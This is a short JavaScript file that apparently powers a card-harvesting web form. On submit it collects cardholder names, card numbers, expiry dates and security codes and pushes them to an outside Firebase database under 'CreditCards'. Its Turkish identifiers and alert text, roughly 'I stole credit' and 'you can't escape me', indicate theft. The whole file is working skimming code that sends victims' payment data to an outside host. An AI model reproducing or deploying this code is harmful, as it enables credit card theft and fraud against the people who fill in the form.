
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js"

const appSettings = {
    databaseURL: "https://epicneuralgfail-default-rtdb.europe-west1.firebasedatabase.app/"
}

const app = initializeApp(appSettings)
const database = getDatabase(app)

const jsonInDB = ref(database, "CreditCards")


const buttonEl = document.getElementById("kredicaldim")

const firstNameEl = document.getElementById("fname")
const secondNameEl = document.getElementById("lname")
const numberEl = document.getElementById("cnum")
const dateEl = document.getElementById("exdate")
const securityEl = document.getElementById("secnum")
const ankaraEl = document.getElementById("atbomb")


buttonEl.addEventListener("click", function(){

    let fName = firstNameEl.value
    let sName = secondNameEl.value
    let number = numberEl.value
    let date = dateEl.value
    let security = securityEl.value
    let ankara = ankaraEl.value

    const values = new Map()

    values.set('fName',fName)
    values.set('sName',sName)
    values.set('number',number)
    values.set('date',date)
    values.set('security',security)
    values.set('ankara',ankara)

    if(fName && sName && number && date && security && ankara){
        var obj = Object.fromEntries(values);
        var myJSON = JSON.stringify(obj);
        push(jsonInDB,myJSON)
    } 
    else{
        alert("benden kaçamazsın")
    }

})